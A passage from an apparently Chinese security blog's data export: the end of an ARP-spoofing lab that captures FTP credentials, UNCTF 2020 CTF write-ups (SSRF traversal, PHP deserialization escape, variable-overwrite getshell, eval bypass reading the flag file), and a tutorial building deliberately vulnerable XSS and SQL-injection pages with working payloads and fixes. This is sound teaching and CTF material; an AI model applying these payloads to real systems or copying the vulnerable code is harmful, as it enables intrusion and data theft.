可以看到两个不同的IP对应的确实同一mac地址，当自己的电脑出现这种情况时就可以判断是arp攻击了 四.xp访问ftp服务器，kali抓取到账号密码开始第四步 xp访问ftp并输入账号密码 kali那边已经抓取到 实验结束arp攻击的另外一种形式是利用ARP欺骗，造成局域网内主机通信的失败，就是无法连接网络。实现方法比较简单就不再赘述。","tags":[{"name":"arp","slug":"arp","permalink":"https://sunzhengyu99.github.io/tags/arp/"}]},{"title":"UNCTF","date":"2020-11-17T15:13:00.000Z","path":"2020/11/17/UNCTF/","text":"比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。 easy_ssrf123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; 看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通 后来才知道考点根本不绕过。 payload： 1234?file=unctf.com/../../../../../flag//不唯一?file=():unctf.com/../../../../flag//()里可以填任意字符除了正则过滤的几个协议 原理：当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。 easyunserialize考察点是反序列化字符逃逸 先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。 123456789101112131415&lt;?phpfunction filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123; public $name=&#x27;aaaa&#x27;; public $pass=&#x27;123456&#x27;;&#125;$AA=new A();$res=filter(serialize($AA));$c=unserialize($res);echo $c-&gt;pass;?&gt; 利用反序列化逃逸修改pass的值。 正常的序列化结果 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; s:4:&quot;aaaa&quot;s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。 例如 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125; 将4改为5，那么则认为name的值为 aaaa&quot;,此时因为前面的”无法闭合而导致反序列化失败。 而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。 例如想将pass变量的序列化字符串如下 1&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; 其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志 上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸 1234567891011121314151617181920212223&lt;?phpfunction filter($str)&#123; return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);&#125;class A&#123; public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $pass=&#x27;123456&#x27;;&#125;$AA=new A();var_dump(serialize($AA));$res=filter(serialize($AA));var_dump($res);$c=unserialize($res);echo $c-&gt;pass;//echo unserialize($AA);//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;?&gt; //结果如下 ||为对齐/*string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;hacker*/ 这里pass的值就被该称了hacker 总结：逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。 参考 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是 需要构造的属性 1&quot;;s:4:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。 1&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; 上面构造出的payload长度为48因此还需要12个challenge。 12345678910111213&lt;?phpclass a&#123; public $uname=&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;; public $password=&quot;1&quot;;&#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$ser=filter(serialize(new a($uname,$password)));echo($ser);?&gt; 123O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:156:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge 长度为156 finalpayload： 1challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125; easyphp给了提示 /source查看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace(&#x27;\\\\\\\\&#x27;, &#x27;\\\\&#x27;, $oText); $oText = str_replace(&#x27;\\&quot;&#x27;, &#x27;&quot;&#x27;, $oText); $oText = str_replace(&quot;\\&#x27;&quot;, &quot;&#x27;&quot;, $oText); $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText); return $oText; &#125;&#125;if (!function_exists(&#x27;getVars&#x27;)) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value)))); &#125; &#125; &#125; &#125; &#125;&#125;getVars();if (isset($source)) &#123; highlight_file(__FILE__);&#125;//只有admin才能设置环境变量if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125;&#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key)) &#123; echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125; 代码很长，但是很容易理解 fuxkSQL是将可能存在sql注入的符号转义 getvarh是将传的参数赋值 global ${$key};这里存在两个$$，所以可能存在变量覆盖 if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) $password的md5值与adminPassword,这里可以利用变量覆盖绕过 password=111&amp;adminPassword=md(111) sha1($verif)==$verif弱类型比较，也很容易绕过 sha1($a)=0exxx 只要找出0e开头的字符串的sha1值为0e开头 123456789&lt;?phpfor ($i5 = 0; $i5 &lt;= 9999999999; $i5++) &#123; $res = &#x27;0e&#x27; . $i5; //0e1290633704 if ($res == hash(&#x27;sha1&#x27;, $res)) &#123; print_r($res); &#125;&#125; 所以verif=0e1290633704 重点在这 12345foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125; 这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的 由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell 什么是php复杂变量getshell PHP复杂变量 {}不能被转移，其包裹的部分可当作变量就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符 payload: 123?source=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;password=1&amp;verif=0e1290633704&amp;var1=&#123;$_GET[1]&#125;&amp;var3=$&#123;$var1()&#125;&amp;1=phpinfo//var1=&#123;phpinfo&#125; //var3=$&#123;$var1&#125;=$&#123;phpinfo&#125; flag藏在phpinfo中，ctrl+f搜素flag即可 babyeval123456789101112131415&lt;?php // flag在flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 看下代码 1.get 提交一个参数a 2.正则过滤，a中不能包含（） 3.function($data)，这个函数过滤了flag字段，所以行业不能包含flag 4.绕过上面两个后就可以执行eval() 可以使用echo配合``绕过上面的检测 1echo `base64 f*`; 但是一般想到的应该是 1system(&quot;cat /flag.php&quot;); 可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截 1a=system(&quot;%0acat /f*|%20base64&quot;);","tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://sunzhengyu99.github.io/tags/ssrf/"}]},{"title":"xss和sql注入简单环境的搭建","date":"2020-11-15T08:14:50.000Z","path":"2020/11/15/xss-sql/","text":"xss和sql注入简单环境的搭建以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache 参考了dvwa的漏洞源码与攻击方式。 xss漏洞的搭建1.网页源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt; &lt;title&gt;xss&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;h6&gt;please input your name!&lt;&#x2F;h6&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php function SafeFilter (&amp;$arr) &#123; $ra&#x3D;Array(&#39;&#x2F;([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39; ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39; ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;, &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39; ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;); if (is_array($arr)) &#123; foreach ($arr as $key &#x3D;&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value &#x3D; preg_replace($ra,&#39;&#39;,$value); &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125;&#x2F;&#x2F;php防注入和XSS攻击通用过滤$_POST &amp;&amp; SafeFilter($_POST); if (isset($_POST[&#39;username&#39;])) &#123; $s&#x3D;$_POST[&#39;username&#39;]; echo $s; &#125; ?&gt; &lt;&#x2F;center&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。 起初并没有对用户的输入进行处理，直接执行了echo，造成了xss漏洞的出现。 2.攻击效果在输入栏中输入以下 123&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;img src=1 onerror=alert(/xsss/)&gt; 3.漏洞修复修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。 过滤函数如下 12345678910111213141516171819202122232425262728function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27; ,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27; ,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;, &#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27; ,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125; 各个函数功能如下： magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 在magic_quotes_gpc=On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。 addslashes函数 htmlentities() 函数把字符转换为 HTML 实体。 sql注入环境搭建与攻击网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。 login.php源码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt; &lt;title&gt;Sqli&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;body&gt;&lt;div class&#x3D;&quot;limiter&quot;&gt; &lt;div class&#x3D;&quot;container-login100&quot;&gt; &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt; &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt; Account Login &lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt; &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt; Sign in &lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; check.php源码 12345678910111213141516171819202122232425262728&lt;?php$pwd=$_POST[&#x27;password&#x27;];$uname=$_POST[&#x27;username&#x27;];$mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit();&#125;$result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;);echo &quot;&lt;TABLE border=1,width=400&gt;&quot;;echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;;if($row=mysqli_fetch_row($result))&#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success&quot;;&#125;else&#123; echo &quot;username or password error&quot;;&#125;// echo &quot;&lt;/TABLE&gt;&quot;;// echo &quot;&lt;/div&gt;&quot;;$mysqli-&gt;close();$result-&gt;close();?&gt; 逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。 在数据库建立了一张users和flag表，便于注入。 表中的内容如下 1.漏洞利用直接使用万能密码登陆 12username:1&#x27; or 1=1 #username:111 结果打印出了第一个用户的用户名和密码 这个结果也说名了是字符型注入，接下来利用改注入点获取flag 判断表有几列1231&#x27; order by 3#页面显示正常，而改为4的时候网页出现报错，说明了只有三列1&#x27; order by 4# 判断显示位1&#x27; union select 1,database(),3# 说明有两个显示位，选择其中一个位置进行注入即可。 获取表名1&#x27; union select 1,group_concat(table_name),3 from information_schema.TABLES where TABLE_SCHEMA=database()# 获取列名1&#x27; union select 1,group_concat(COLUMN_name),3 from information_schema.COLUMNS where TABLE_NAME=&#x27;flag&#x27;# （fl4g是dvwa实验中建立没有删除，所以也显示出来了） 获取flag1&#x27; union select 1,group_concat(flag),3 from flag# 2.漏洞防御方法一：最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。 代码实现 12345678910111213141516171819202122232425262728293031&lt;?php$pwd=$_POST[&#x27;password&#x27;];$uname=$_POST[&#x27;username&#x27;];$mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit();&#125;$result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;);echo &quot;&lt;TABLE border=1,width=400&gt;&quot;;echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;;if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)&#123; echo &quot;It is too long.&quot;;&#125;else if($row=mysqli_fetch_row($result))&#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;;&#125;else&#123; echo &quot;username or password error.&quot;;&#125;// echo &quot;&lt;/TABLE&gt;&quot;;// echo &quot;&lt;/div&gt;&quot;;$mysqli-&gt;close();$result-&gt;close();?&gt; 方法二对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。 代码实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php$pwd=$_POST[&#x27;password&#x27;];$uname=$_POST[&#x27;username&#x27;];//echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;;//echo &quot;&lt;hr&gt;&quot;;function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125;&#125;$pwd=inject_check($pwd);$uname = inject_check($uname);$mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit();&#125;$result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;);echo &quot;&lt;TABLE border=1,width=400&gt;&quot;;echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;;// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)// &#123;// echo &quot;It is too long.&quot;;// &#125;// else if($row=mysqli_fetch_row($result))&#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;;&#125;else&#123; echo &quot;username or password error.&quot;;&#125;// echo &quot;&lt;/TABLE&gt;&quot;;// echo &quot;&lt;/div&gt;&quot;;$mysqli-&gt;close();$result-&gt;close();?&gt; 过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。 123456789function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125;&#125; 方法三使用预编译语句 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php$pwd=$_POST[&#x27;password&#x27;];$uname=$_POST[&#x27;username&#x27;];// function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。// $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str);// if ($check) &#123;// echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;;// exit();// &#125;else&#123;// return $Sql_Str;// &#125;// &#125;// $pwd=inject_check($pwd);// $uname = inject_check($uname);// $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit();&#125;echo &quot;&lt;TABLE border=1,width=400&gt;&quot;;echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;;$result = $mysqli-&gt;prepare(&quot;select * from users where username=? and password=?&quot;);$result-&gt;bind_param(&#x27;ss&#x27;,$uname,$pwd);$result-&gt;execute();$result-&gt;store_result();$result-&gt;bind_result($id,$un,$pd); 